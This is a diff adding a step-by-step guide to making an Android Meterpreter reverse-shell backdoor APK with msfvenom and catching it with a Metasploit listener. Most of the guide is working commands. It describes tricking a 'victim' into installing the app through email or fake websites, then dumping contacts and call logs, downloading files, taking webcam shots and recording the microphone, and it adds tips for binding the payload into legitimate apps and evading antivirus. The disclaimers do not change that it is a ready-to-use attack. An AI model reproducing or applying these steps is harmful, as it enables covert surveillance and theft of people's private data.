@@ -1,0 +1,122 @@
+
+⚠️ Warning:
+This guide is for educational and authorized penetration testing only. Unauthorized access to systems is illegal and unethical.
+
+✅ Requirements:
+Kali Linux (latest version)
+
+Metasploit Framework (comes pre-installed)
+
+apktool and keytool (optional, for APK binding)
+
+Android device (your own or authorized testing)
+
+🧪 Step 1: Generate Android Payload APK
+Open a terminal and run:
+
+bash
+Copy
+Edit
+msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o android_payload.apk
+Replace:
+
+YOUR_IP with your Kali IP address.
+
+4444 with your desired port.
+
+Example:
+
+bash
+Copy
+Edit
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o /root/Desktop/backdoor.apk
+🧲 Step 2: Set Up Metasploit Listener
+Open msfconsole:
+
+bash
+Copy
+Edit
+msfconsole
+Then run:
+
+bash
+Copy
+Edit
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+exploit
+Wait for the session to open when the victim installs and opens the APK.
+
+📲 Step 3: Deliver Payload to Target Device
+Use social engineering or bind it with a real app (not covered here) and send via:
+
+Email
+
+Fake website
+
+File sharing
+
+The victim must install and open the APK for the payload to activate.
+
+📟 Step 4: Control Android Device (Meterpreter)
+Once the victim installs the app, you’ll get a Meterpreter session:
+
+bash
+Copy
+Edit
+meterpreter >
+Run commands to extract information:
+
+🧾 Extract Contacts:
+bash
+Copy
+Edit
+dump_contacts
+📞 Extract Call Logs:
+bash
+Copy
+Edit
+dump_calllog
+📁 Explore Files:
+bash
+Copy
+Edit
+ls
+cd /sdcard/
+download somefile.jpg
+📷 Capture Webcam:
+bash
+Copy
+Edit
+webcam_snap
+🎤 Record Audio:
+bash
+Copy
+Edit
+record_mic
+🔚 Step 5: Close Session
+To exit:
+
+bash
+Copy
+Edit
+exit
+Or background the session:
+
+bash
+Copy
+Edit
+background
+🧼 Optional: Evade Detection
+Use tools like:
+
+apktool to bind with a legit APK
+
+msfvenom -x original.apk for payload injection
+
+Obfuscators to bypass AV detection
+
+🛑 Legal Reminder
+Metasploit must only be used in legally authorized environments—on your own devices or with written permission.
